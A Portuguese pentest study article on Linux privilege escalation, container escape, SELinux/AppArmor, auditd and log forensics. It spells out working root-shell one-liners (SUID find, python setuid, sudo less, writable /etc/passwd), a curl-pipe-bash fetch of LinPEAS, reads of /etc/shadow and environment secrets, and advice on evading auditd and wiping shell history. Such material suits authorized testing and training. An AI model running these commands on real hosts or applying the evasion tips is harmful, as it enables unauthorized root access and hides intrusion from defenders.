---
title: Linux Hardening & Forense Básica para Pentest
category: auth
stack: [Linux, SELinux, AppArmor, auditd, namespaces, capabilities]
tags: [linux, hardening, forensics, priv-esc, pentest]
excerpt: Base de Linux que pentester precisa pra entender priv-esc, container escape e o que os defenders veem nos logs.
related: [sec-toolkit-pentest-2026, sec-k8s-container-pentest, sec-post-exploitation]
updated: "2026-05-10"
---

## Por que isso importa

Em engagement Linux você precisa de duas coisas: **(1)** entender o que **eleva privilégio** (sudo, SUID, capabilities, kernel CVE) e **(2)** entender o que o **defender vai ver** (auditd, syslog, journald). Quem só sabe `sudo -l` perde 70% das oportunidades.

## Modelo de permissão real (além de rwx)

| Mecanismo | Quando importa |
|-----------|----------------|
| **DAC** (rwx, owner/group) | Default. Burlado por SUID, sudo, capabilities. |
| **SUID/SGID** | Binário roda como owner. `find / -perm -4000 2>/dev/null` lista. GTFOBins lista quais bypassam shell restrita. |
| **Capabilities** | Permissões granulares. `cap_setuid+ep` em binário = root. `getcap -r / 2>/dev/null`. |
| **sudoers** | `/etc/sudoers` + `/etc/sudoers.d/`. `sudo -l` lista o que pode rodar. NOPASSWD + binário GTFOBins = root. |
| **SELinux** | Mandatory Access Control. `getenforce`. Se enforcing, exploits Linux comuns podem falhar mesmo com root local. |
| **AppArmor** | Path-based MAC (Ubuntu, Debian). `aa-status`. Mais simples que SELinux, escapa via path traversal em policy mal feita. |

## Caminhos clássicos de priv-esc

```bash
# 1. Kernel exploit (último recurso — barulhento)
uname -a              # versão exata
# Procura CVE: 'linux kernel <version> privilege escalation'
# Exemplos: CVE-2022-0847 (Dirty Pipe), CVE-2021-4034 (PwnKit), CVE-2023-32233 (nftables)

# 2. SUID binaries → GTFOBins
find / -perm -4000 -type f 2>/dev/null
# Cada binário tem em https://gtfobins.github.io. Ex:
# find . -exec /bin/sh -p \; -quit   ← se find é SUID

# 3. Sudo + NOPASSWD
sudo -l
# (ALL : ALL) NOPASSWD: /usr/bin/less
# less → !sh → root

# 4. Capabilities
getcap -r / 2>/dev/null
# /usr/bin/python3.10 cap_setuid+ep → python -c 'import os; os.setuid(0); os.system("/bin/sh")'

# 5. Cron jobs com path relativo ou wildcards
cat /etc/crontab
ls -la /etc/cron.*/

# 6. Writable /etc/passwd ou /etc/shadow
ls -la /etc/passwd /etc/shadow
# Se writable: openssl passwd -1 -salt x pass123 → adiciona linha

# 7. Container escape (se em container)
mount | grep -E "docker|kube"
ls -la /.dockerenv
# Privileged container, hostPath, SYS_ADMIN cap, /proc/self/exe → escape
```

Automatize com **LinPEAS** (`linpeas.sh`) ou **linux-smart-enumeration** — eles cobrem 95% dos vetores.

## Namespaces & Capabilities — base de container

Container é namespaces + cgroups + capabilities, não VM. Em pentest de Kubernetes / Docker:

- **PID namespace**: container vê só seus próprios processos. Se compartilha PID host (`--pid=host`), você vê tudo.
- **Mount namespace**: filesystem isolado. Mas `/proc` exposto + `CAP_SYS_PTRACE` → ler memória do host.
- **Capabilities perigosas em container**:
  - `CAP_SYS_ADMIN`: root virtual, monte filesystem, escape via cgroups.
  - `CAP_SYS_PTRACE`: ler memória de outros processos.
  - `CAP_DAC_READ_SEARCH`: ler qualquer arquivo (bypass DAC).
  - `CAP_NET_RAW`: raw socket, ARP spoofing.
  - `CAP_NET_ADMIN`: configurar rede, iptables.

```bash
# Lista capabilities do processo atual (em container)
cat /proc/self/status | grep ^Cap

# Decodifica com capsh
capsh --decode=00000000a80425fb
```

## SELinux / AppArmor — quando atrapalha (a você ou ao atacante)

**SELinux enforcing** quebra muitos exploits Linux porque restringe transições de domínio. Em pentest:

```bash
getenforce          # Enforcing / Permissive / Disabled
sestatus
ls -Z /var/www/     # contextos SELinux
ausearch -m AVC -ts recent   # logs de violação
```

Se SELinux for permissive (loga mas não bloqueia): você pode explorar, mas defender vai ver tudo. Se enforcing, considere atacar processos em **unconfined_t** ou aproveitar policies mal escritas que permitem `setrans`.

**AppArmor** é mais fácil de mapear:

```bash
aa-status
cat /etc/apparmor.d/usr.bin.firefox     # policy do binário
# Procurar permissões largas tipo "/** rwk"
```

## Auditd — o que os defenders veem

Em engagement red team, saber o que `auditd` captura define sua OPSEC. Default em RHEL/CentOS modernos:

```bash
# Regras ativas
auditctl -l

# Procurar eventos recentes (exemplo: execve)
ausearch -k execve -ts today
aureport --executable --summary

# Logs em /var/log/audit/audit.log (não rotacionado por padrão!)
```

Auditd captura: `execve` (todos comandos executados), `connect` (todas as conexões de rede saindo), edição de `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`. Boa configuração de blue team segue Linux Auditing System (Neo23x0/auditd) ou MITRE D3FEND.

**OPSEC pro red teamer**: usar binários builtin (LOLBins do Linux: `bash -i`, `nc`, `socat`, `python -c`) em vez de droppar tools, evitar `/tmp` (loga), preferir `/dev/shm` (RAM), checar `histappend`/`histfile` antes de qualquer comando.

## Journald, syslog & rsyslog

- `journalctl -xe` — logs do systemd, incluindo sshd auth.
- `/var/log/auth.log` (Debian/Ubuntu) ou `/var/log/secure` (RHEL) — sshd, sudo, su.
- `/var/log/syslog` ou `/var/log/messages` — geral.
- `/var/log/wtmp`, `utmp`, `btmp` — login history (`last`, `lastb`).

Apagar logs **é detectado** — auditd loga edições de `/var/log/`. Em red team, prefira não logar (`HISTFILE=/dev/null`, `set +o history`) ao tentar apagar depois.

## Forense básica que você precisa entender (como ofensivo)

Se você sabe o que o blue team vai procurar, sabe como deixar menos rastro:

| Artefato | Como apagar (e por que não fazer) |
|----------|----------------------------------|
| Bash history | `unset HISTFILE` antes; depois, edição é detectada. |
| `.viminfo`, `.lesshst` | Apagar é OK mas timestamp do diretório muda. |
| auditd | Não dá pra apagar sem root + impacto enorme. |
| journald | binário; intervenção quase sempre detectável. |
| `/tmp/*` | Apagar OK, mas inotify pode estar configurado. |
| Network artifacts | `tcpdump` cap em host de monitoring é fora do seu controle. |

## Comandos cheat-sheet

```bash
# Enumeração rápida
id; whoami; groups
uname -a; cat /etc/os-release
sudo -l; sudo -ll
find / -perm -4000 -type f 2>/dev/null
find / -writable -type d 2>/dev/null | grep -vE "/proc|/sys"
cat /etc/passwd; cat /etc/shadow 2>/dev/null
ps auxf; netstat -tulpn 2>/dev/null || ss -tulpn
cat ~/.bash_history; cat /home/*/.bash_history 2>/dev/null
mount; df -h
env; cat /proc/self/environ 2>/dev/null

# Auto: LinPEAS
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash
```

## Armadilhas

1. **`find ... -perm -4000` sem `2>/dev/null`** → spam de stderr, perde lista.
2. **Editar `/etc/passwd` sem testar o hash**: sintaxe errada bloqueia login.
3. **`sudo su -` com password do user atual**: muitas vezes funciona se user está no grupo sudo + NOPASSWD não está setado pra binário específico.
4. **Esquecer que `~/.ssh/authorized_keys` deve ser 600** e diretório 700, senão sshd ignora.

## Leituras

- "Linux Privilege Escalation" — TryHackMe path
- HackTricks Linux Hardening section (book.hacktricks.xyz)
- "Auditing Linux for Pentesters" — Neo23x0/auditd repo
- LinPEAS source code (ler é educacional)
